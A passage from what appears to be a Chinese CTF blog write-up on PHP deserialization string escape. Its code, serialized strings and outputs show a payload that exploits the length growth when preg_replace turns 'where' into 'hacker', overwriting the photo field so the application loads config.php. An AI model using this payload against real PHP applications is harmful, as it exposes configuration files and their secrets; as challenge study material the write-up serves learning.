+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [phone] &#x3D;&gt; 13588888888</span><br><span class="line">    [email] &#x3D;&gt; 123123123@qq.com</span><br><span class="line">    [nickname] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; name</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [photo] &#x3D;&gt; config.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>所以要将 <code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> (34个长度)添加到name后面</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$profile[&#39;phone&#39;] &#x3D; &#39;13588888888&#39;;</span><br><span class="line">$profile[&#39;email&#39;] &#x3D; &#39;123123123@qq.com&#39;;</span><br><span class="line">$profile[&#39;nickname&#39;][] &#x3D; &#39;name&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#39;;</span><br><span class="line">$profile[&#39;photo&#39;] &#x3D; &#39;123&#39;;</span><br><span class="line"></span><br><span class="line">echo serialize($profile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<blockquote>
+<p>a:4:{s:5:”phone”;s:11:”13588888888”;s:5:”email”;s:16:”<a href="mailto:&#49;&#50;&#51;&#x31;&#50;&#51;&#x31;&#x32;&#x33;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;">&#49;&#50;&#51;&#x31;&#50;&#51;&#x31;&#x32;&#x33;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;</a>“;s:8:”nickname”;a:1:{i:0;s:38:”name”;}s:5:”photo”;s:10:”config.php”;}”;}s:5:”photo”;s:3:”123”;}</p>
+</blockquote>
+<p>这里要是直接反序列化肯定不对，因为在这里：<code>s:38:“name”</code> ，你明明告诉我这里有38个长度，你怎么就给我4个长度呀，所以就会继续把构造的payload接着收集，直到38个长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [phone] &#x3D;&gt; 13588888888</span><br><span class="line">    [email] &#x3D;&gt; 123123123@qq.com</span><br><span class="line">    [nickname] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; name&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [photo] &#x3D;&gt; 123</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>那怎么多出来34个长度？</p>
+<p>利用 <code>preg_replace</code>，将where传入后被替换为hacker，每一个where都会多出一个长度，所以 <code>34个where+payload经过替换后，payload就会生效</code></p>
+<p><img src="https://img-blog.csdnimg.cn/2021050302151655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>或者手动在序列化字符串后加34个长度</p>
+<blockquote>
+<p>a:4:{s:5:”phone”;s:11:”13588888888”;s:5:”email”;s:16:”<a href="mailto:&#49;&#x32;&#51;&#49;&#x32;&#51;&#x31;&#50;&#51;&#x40;&#x71;&#x71;&#x2e;&#99;&#111;&#109;">&#49;&#x32;&#51;&#49;&#x32;&#51;&#x31;&#50;&#51;&#x40;&#x71;&#x71;&#x2e;&#99;&#111;&#109;</a>“;s:8:”nickname”;a:1:{i:0;s:38:”name1111111111111111111111111111111111”;}s:5:”photo”;s:10:”config.php”;}”;}s:5:”photo”;s:3:”123”;}</p>
+</blockquote>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [phone] &#x3D;&gt; 13588888888</span><br><span class="line">    [email] &#x3D;&gt; 123123123@qq.com</span><br><span class="line">    [nickname] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; name1111111111111111111111111111111111</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [photo] &#x3D;&gt; config.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/27/HeroCTF(web)/" rel="prev" title="HeroCTF(web)">
+      <i class="fa fa-chevron-left"></i> HeroCTF(web)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E4%B9%9F%E5%A4%AA%E8%8F%9C%E4%BA%86%E5%90%A7"><span class="nav-number">1.</span> <span class="nav-text">我也太菜了吧</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="程勇胜"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">程勇胜</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">53</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">程勇胜</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
